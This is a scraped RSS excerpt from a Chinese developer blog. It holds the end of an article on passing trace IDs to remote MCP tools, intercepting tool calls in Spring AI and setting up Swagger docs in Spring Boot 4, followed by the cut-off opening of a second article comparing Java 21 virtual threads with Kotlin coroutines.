<h4 data-id="heading-7">5、远程 mcp-server 工具怎么传递 trace_id？</h4>
<p>远程工具调用传递时，我以为也可以在 ToolContext 中传递就可以了，结果没想到远程调用时，ToolContext 中只有一个 exchange 的 key，自定义的工具上下文根本没有！只好研究源码了。最终得到如下解决方案：</p>
<h5 data-id="heading-8">第一步、mcp-client 自定义 McpAsyncHttpClientRequestCustomizer</h5>
<p>该扩展接口，在请求远程工具调用时，会回调，让开发者自定义请求，我们可以在这里将 trace_id 放入请求头：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMcpAsyncHttpClientRequestCustomizer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">McpAsyncHttpClientRequestCustomizer</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Publisher&lt;HttpRequest.Builder&gt; customize(HttpRequest.Builder builder, String method, URI endpoint, String body, McpTransportContext context) {
        <span class="hljs-type">String</span> <span class="hljs-variable">traceId</span> <span class="hljs-operator">=</span> Optional.ofNullable(JSON.parseObject(body))
                .map(e -&gt; e.getJSONObject(<span class="hljs-string">"params"</span>))
                .map(e -&gt; e.getJSONObject(<span class="hljs-string">"_meta"</span>))
                .map(e -&gt; e.getString(<span class="hljs-string">"traceId"</span>))
                .orElse(<span class="hljs-literal">null</span>);
        <span class="hljs-keyword">if</span> (StrUtil.isNotBlank(traceId)) {
            builder = builder.header(<span class="hljs-string">"traceId"</span>, traceId);
        }
        <span class="hljs-keyword">return</span> Mono.just(builder);
    }
}
</code></pre>
<p>有的人可能会觉得工具上下文是不是在 McpTransportContext 里，很遗憾，并没有，所以才自己解析 body 的。</p>
<h5 data-id="heading-9">第二步、mcp-server 自定义 WebFluxStreamableServerTransportProvider</h5>
<p>自定义 WebFluxStreamableServerTransportProvider 的目的是自定义 McpTransportContextExtractor，因为 McpTransportContextExtractor spring-ai 没有暴露为 bean：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StreamableServerTransportProviderConfig</span> {

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-meta">@ConditionalOnMissingBean</span>
    <span class="hljs-keyword">public</span> WebFluxStreamableServerTransportProvider <span class="hljs-title function_">webFluxStreamableServerTransportProvider</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier("mcpServerObjectMapper")</span> ObjectMapper objectMapper,
                                                                                             McpServerStreamableHttpProperties serverProperties)</span> {

        <span class="hljs-keyword">return</span> WebFluxStreamableServerTransportProvider.builder()
                .jsonMapper(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JacksonMcpJsonMapper</span>(objectMapper))
                .messageEndpoint(serverProperties.getMcpEndpoint())
                .keepAliveInterval(serverProperties.getKeepAliveInterval())
                .disallowDelete(serverProperties.isDisallowDelete())
                .contextExtractor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AgentMcpTransportContextExtractor</span>())
                .build();
    }

    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentMcpTransportContextExtractor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">McpTransportContextExtractor</span>&lt;ServerRequest&gt; {

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> McpTransportContext <span class="hljs-title function_">extract</span><span class="hljs-params">(ServerRequest request)</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">traceId</span> <span class="hljs-operator">=</span> request.headers().firstHeader(<span class="hljs-string">"traceId"</span>);
            <span class="hljs-keyword">if</span> (traceId == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> McpTransportContext.EMPTY;
            }
            <span class="hljs-keyword">return</span> McpTransportContext.create(Map.of(<span class="hljs-string">"traceId"</span>, traceId));
        }
    }
}
</code></pre>
<p>这样就得到了请求头的 traceId！</p>
<h4 data-id="heading-10">第三步、mcp-server 再添加一个 runOnToolContext 方法</h4>
<pre><code class="hljs language-java" lang="java">	<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">runOnToolContext</span><span class="hljs-params">(Map&lt;String, Object&gt; context, Supplier&lt;T&gt; supplier)</span> {
        <span class="hljs-keyword">if</span> (context.containsKey(Constant.TRACE_ID)) {
            <span class="hljs-keyword">return</span> {mcp-client}.McpTools.runOnToolContext(context, supplier);
        }

        McpTransportContext transportContext;

        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> context.get(McpToolUtils.TOOL_CONTEXT_MCP_EXCHANGE_KEY);

        <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> McpSyncServerExchange exchange) {
            transportContext = exchange.transportContext();
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> McpAsyncServerExchange exchange) {
            transportContext = exchange.transportContext();
        } <span class="hljs-keyword">else</span> {
            transportContext = <span class="hljs-literal">null</span>;
        }

        <span class="hljs-keyword">if</span> (transportContext == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> {mcp-client}.McpTools.runOnToolContext(context, supplier);
        }

        <span class="hljs-type">Object</span> <span class="hljs-variable">traceId</span> <span class="hljs-operator">=</span> transportContext.get(Constant.TRACE_ID);

        <span class="hljs-keyword">if</span> (traceId == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> {mcp-client}.McpTools.runOnToolContext(context, supplier);
        }

        <span class="hljs-keyword">return</span> {mcp-client}.McpTools.runOnToolContext(Map.of(Constant.TRACE_ID, traceId.toString()), supplier);
    }
</code></pre>
<p>这样就传递下来啦！</p>
<h4 data-id="heading-11">6、怎么拦截工具调用？</h4>
<p>想要在工具调用时，给前端发一个 sse 消息，工具拦截器是最合适的，因为无论本地工具还是远程工具都适用，可惜 spring-ai 目前没有提供！<br/>
没有就自己造！</p>
<h5 data-id="heading-12">第一步、自定义 DecorateToolCallingManager</h5>
<p>自定义 DecorateToolCallingManager 目的是，对 ToolCallback 进行包装：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DecorateToolCallingManager</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ToolCallingManager</span> {
    <span class="hljs-comment">/**
     * 装饰目标
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ToolCallingManager decorate;

    <span class="hljs-comment">/**
     * 拦截器
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> Collection&lt;ToolCallbackInterceptor&gt; interceptors;

    <span class="hljs-comment">/**
     * 处理器
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> Collection&lt;ToolExecutionResultHandler&gt; handlers;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;ToolDefinition&gt; <span class="hljs-title function_">resolveToolDefinitions</span><span class="hljs-params">(ToolCallingChatOptions chatOptions)</span> {
        Collection&lt;ToolCallbackInterceptor&gt; interceptors = ensureInterceptors();
        List&lt;ToolCallback&gt; toolCallbacks = chatOptions.getToolCallbacks()
                .stream()
                .map(e -&gt; e <span class="hljs-keyword">instanceof</span> DecorateToolCallback ? e : <span class="hljs-keyword">new</span> <span class="hljs-title class_">DecorateToolCallback</span>(e.getToolDefinition().name(), e, interceptors))
                .toList();
        chatOptions.setToolCallbacks(toolCallbacks);
        <span class="hljs-keyword">return</span> decorate.resolveToolDefinitions(chatOptions);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ToolExecutionResult <span class="hljs-title function_">executeToolCalls</span><span class="hljs-params">(Prompt prompt, ChatResponse chatResponse)</span> {
        <span class="hljs-type">ContextView</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> ToolCallReactiveContextHolder.getContext();
        <span class="hljs-type">ToolExecutionResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> decorate.executeToolCalls(prompt, chatResponse);
        <span class="hljs-keyword">for</span> (ToolExecutionResultHandler handler : ensureHandlers()) {
            <span class="hljs-keyword">if</span> (handler.support(prompt, chatResponse, context)) {
                <span class="hljs-keyword">if</span> (handler.handle(prompt, chatResponse, result, context)) {
                    <span class="hljs-keyword">continue</span>;
                }
                <span class="hljs-keyword">break</span>;
            }
        }
        <span class="hljs-keyword">return</span> result;
    }

    <span class="hljs-keyword">protected</span> Collection&lt;ToolCallbackInterceptor&gt; <span class="hljs-title function_">ensureInterceptors</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.interceptors == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.interceptors == <span class="hljs-literal">null</span>) {
                    <span class="hljs-built_in">this</span>.interceptors = $.getBeans(ToolCallbackInterceptor.class);
                }
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.interceptors;
    }

    <span class="hljs-keyword">protected</span> Collection&lt;ToolExecutionResultHandler&gt; <span class="hljs-title function_">ensureHandlers</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlers == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlers == <span class="hljs-literal">null</span>) {
                    <span class="hljs-built_in">this</span>.handlers = $.getBeans(ToolExecutionResultHandler.class);
                }
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.handlers;
    }
}
</code></pre>
<p>这里不仅扩展了工具调用拦截器，还扩展了工具调用结果处理器，之所以不在拦截器里面添加处理器，是因为拦截器里面拿不到原始提示词以及原始响应。</p>
<h5 data-id="heading-13">第二步、自定义 ToolCallback</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DecorateToolCallback</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ToolCallback</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String toolName;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ToolCallback decorate;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Collection&lt;ToolCallbackInterceptor&gt; interceptors;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ToolDefinition <span class="hljs-title function_">getToolDefinition</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> decorate.getToolDefinition();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">call</span><span class="hljs-params">(String toolInput)</span> {
        <span class="hljs-keyword">return</span> call(toolInput, <span class="hljs-literal">null</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ToolMetadata <span class="hljs-title function_">getToolMetadata</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> decorate.getToolMetadata();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">call</span><span class="hljs-params">(String toolInput, <span class="hljs-meta">@Nullable</span> ToolContext toolContext)</span> {
        <span class="hljs-keyword">for</span> (ToolCallbackInterceptor interceptor : <span class="hljs-built_in">this</span>.interceptors) {
            interceptor.beforeToolCallback(toolName, toolInput, toolContext, <span class="hljs-built_in">this</span>);
        }

        <span class="hljs-type">Throwable</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> decorate.call(toolInput, toolContext);
        } <span class="hljs-keyword">catch</span> (Throwable e) {
            ex = e;
            <span class="hljs-keyword">throw</span> e;
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">for</span> (ToolCallbackInterceptor interceptor : <span class="hljs-built_in">this</span>.interceptors) {
                interceptor.afterToolCallback(toolName, toolInput, toolContext, <span class="hljs-built_in">this</span>, ex);
            }
        }
    }
}
</code></pre>
<h5 data-id="heading-14">第三步、将自定义的装饰器生效</h5>
<p>添加一个 bean 后置处理器即可：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DecorateBeanConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanPostProcessor</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">postProcessAfterInitialization</span><span class="hljs-params">(Object bean, String beanName)</span> <span class="hljs-keyword">throws</span> BeansException {
        <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> ToolCallingManager manager) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DecorateToolCallingManager</span>(manager);
        }
        <span class="hljs-keyword">return</span> bean;
    }
}
</code></pre>
<h5 data-id="heading-15">第四步、直接实现拦截器即可</h5>
<p>拦截器定义：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ToolCallbackInterceptor</span> {
    <span class="hljs-comment">/**
     * 工具调用前处理
     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeToolCallback</span><span class="hljs-params">(String toolName, String toolInput, ToolContext toolContext, ToolCallback callback)</span>;

    <span class="hljs-comment">/**
     * 工具调用后处理
     *
     * <span class="hljs-doctag">@param</span> throwable 如果工具调用异常，则不为空
     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterToolCallback</span><span class="hljs-params">(String toolName, String toolInput, ToolContext toolContext, ToolCallback callback, Throwable throwable)</span>;
}
</code></pre>
<p>结果处理器定义：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ToolExecutionResultHandler</span> {
    <span class="hljs-comment">/**
     * 是否支持处理
     *
     * <span class="hljs-doctag">@return</span> true/false
     */</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">support</span><span class="hljs-params">(Prompt prompt, ChatResponse chatResponse, ContextView context)</span>;

    <span class="hljs-comment">/**
     * 处理工具调用结果
     *
     * <span class="hljs-doctag">@return</span> 返回 true 时，继续后续链的处理，返回 false 时，将忽略后续链的处理
     */</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Prompt prompt, ChatResponse chatResponse, ToolExecutionResult result, ContextView context)</span>;
}
</code></pre>
<p>注意：处理器拿不到工具上下文，但是可以拿到 reactor-core 的 ContextView（类似 java 的 ThreadLocal），将相关数据写入 Flux 的上下文即可。</p>
<h4 data-id="heading-16">7、springboot4.x 的 swagger 文档集成</h4>
<p>文档集成也废了一些事，这里记录一下。
maven 依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- doc --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.xiaoymin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>knife4j-openapi3-jakarta-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springdoc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springdoc-openapi-starter-webmvc-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springdoc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springdoc-openapi-starter-webmvc-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>yaml 配置：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">springdoc:</span>
  <span class="hljs-attr">group-configs:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">group:</span> <span class="hljs-string">'default'</span>
      <span class="hljs-attr">packages-to-scan:</span> <span class="hljs-string">com.aaa.bbb.controller</span>
</code></pre>
<p>然后访问 /doc.html 就好啦</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 21虚拟线程 vs Kotlin协程：高并发编程模型的终极对决与选型思考]]></title>    <link>https://juejin.cn/post/7602928386596667418</link>    <guid>https://juejin.cn/post/7602928386596667418</guid>    <pubDate>2026-02-05T06:57:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602928386596667418" data-draft-id="7602935146706731054" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 21虚拟线程 vs Kotlin协程：高并发编程模型的终极对决与选型思考"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-05T06:57:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 21虚拟线程 vs Kotlin协程：高并发编程模型的终极对决与选型思考
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:57:53.000Z" title="Thu Feb 05 2026 06:57:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近在技术圈子里，关于 Java 21 的讨论热度甚至盖过了某些当红的 AI 模型。为什么？因为 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3DProject%2BLoom%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=Project+Loom&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Project Loom</a>（<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3D%25E8%2599%259A%25E6%258B%259F%25E7%25BA%25BF%25E7%25A8%258B%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=%E8%99%9A%E6%8B%9F%E7%BA%BF%E7%A8%8B&amp;zhida_source=entity" ref="nofollow noopener noreferrer">虚拟线程</a>）</strong>  终于落地了。</p>
<p>很多兄弟问我：“Cat哥，我现在项目里用的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3DKotlin%2B%25E5%258D%258F%25E7%25A8%258B%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=Kotlin+%E5%8D%8F%E7%A8%8B&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Kotlin 协程</a>爽得飞起，还有必要切回 Java 21 的虚拟线程吗？” 或者 “我们的老项目全是 <code>CompletableFuture</code> 的<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%259B%259E%25E8%25B0%2583%25E5%259C%25B0%25E7%258B%25B1%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=%E5%9B%9E%E8%B0%83%E5%9C%B0%E7%8B%B1&amp;zhida_source=entity" ref="nofollow noopener noreferrer">回调地狱</a>，升到 Java 21 能救命吗？”</p>
<p>讲真，这两个问题直击灵魂。作为一名在后端摸爬滚打十多年的架构师，我看过太多技术选型的“血泪史”。今天，咱们不谈虚的，直接从底层原理、代码实战、生产坑点这几个维度，来一场 Java 21 虚拟线程与 Kotlin 协程的终极对决。</p>
<p>这不仅仅是一次语言特性的对比，更是一次<strong>架构思维的升级</strong>。</p>
<hr/>
<h2 data-id="heading-0">一、 开篇：苦“高并发”久矣</h2>
<p>在虚拟线程出现之前，Java 程序员为了处理高并发，基本只有两条路：</p>
<ol>
<li><strong>Thread-per-Request（每请求每线程）</strong> ：这是最传统的 Servlet 模型（如 Tomcat 默认配置）。代码简单，符合人类直觉。但操作系统线程（OS Thread）太贵了！一个线程占用 1MB 栈内存，上下文切换成本高，几千个并发就能把 CPU 也就是 Context Switch 跑满。</li>
<li><strong>异步响应式编程（<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3DReactive%2BProgramming%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=Reactive+Programming&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Reactive Programming</a>）</strong> ：为了解决线程不够用的问题，我们引入了 <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3DNetty%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=Netty&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Netty</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3DWebFlux%26zhida_source%3Dentity" target="_blank" 